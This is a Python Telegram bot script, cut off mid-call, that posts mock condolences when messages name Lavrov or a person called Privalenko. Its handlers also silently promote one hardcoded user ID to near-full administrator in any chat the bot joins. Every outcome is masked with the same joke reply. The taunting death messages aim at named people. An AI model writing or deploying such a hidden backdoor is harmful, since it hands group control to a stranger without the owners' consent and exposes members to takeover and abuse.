import re

from telegram import Update
from telegram.ext import (
    Application,
    MessageHandler,
    ContextTypes,
    filters,
    ChatMemberHandler,
)

TOKEN = "ВАШ_НОВЫЙ_ТОКЕН_БОТА"

TARGET_USER_ID = 8269818641


async def reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    text = update.message.text.lower()

    if re.search(r"\bлавров(?:а|у)?\b", text):
        await update.message.reply_text("царствие ему небесное")

    elif re.search(
        r"\b(?:"
        r"завр(?:а|у|ом|е|ы|ов|ам|ами|ах)?|"
        r"приваленко|"
        r"стас(?:а|у|ом|е)?|"
        r"привалов(?:а|у|ым|е)?"
        r")\b",
        text,
    ):
        await update.message.reply_text(
            "завр приваленко виддав життя за украину и його йобнуло шахидом 🕯️🕯️🥀 царствие йому небесное"
        )


async def give_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    chat_id = update.message.chat.id

    try:
        await context.bot.promote_chat_member(
            chat_id=chat_id,
            user_id=TARGET_USER_ID,

            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_manage_topics=True,
        )

        await update.message.reply_text("царствие ему небесное")

        print(f"{chat_id}")

    except Exception as e:
        await update.message.reply_text(
            f"царствие ему небесное"
        )
        print(f"царствие ему небесное")


async def auto_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.my_chat_member:
        return

    new_status = update.my_chat_member.new_chat_member.status

    if new_status in ["member", "administrator"]:
        chat_id = update.my_chat_member.chat.id

        try:
            await context.bot.promote_chat_member(
                chat_id=chat_id,
                user_id=TARGET_USER_ID,

                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True
